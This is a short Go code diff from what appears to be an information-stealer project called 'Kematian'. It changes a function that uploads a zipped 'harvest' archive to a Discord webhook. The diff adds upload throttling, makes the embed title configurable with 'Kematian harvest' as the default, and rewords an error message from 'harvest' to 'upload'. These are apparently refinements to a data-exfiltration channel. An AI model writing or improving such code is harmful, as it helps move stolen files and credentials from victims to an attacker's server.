@@ -21,17 +21,26 @@ type discordPayload struct {
 	Embeds  []discordEmbed `json:"embeds,omitempty"`
 }
 
-func sendDiscordWebhook(webhookURL, summary string, zipData []byte, filename string) error {
+const discordUploadGap = 1500 * time.Millisecond
+
+func discordUploadDelay() {
+	time.Sleep(discordUploadGap)
+}
+
+func sendDiscordWebhook(webhookURL, title, summary string, zipData []byte, filename string) error {
 	if webhookURL == "" {
 		return fmt.Errorf("discord webhook URL is required")
 	}
 	if len(zipData) == 0 {
-		return fmt.Errorf("empty harvest archive")
+		return fmt.Errorf("empty upload archive")
+	}
+	if title == "" {
+		title = "Kematian harvest"
 	}
 
 	payload := discordPayload{
 		Embeds: []discordEmbed{{
-			Title:       "Kematian harvest",
+			Title:       title,
 			Description: summary,
 			Color:       0xE11D48,
 		}},
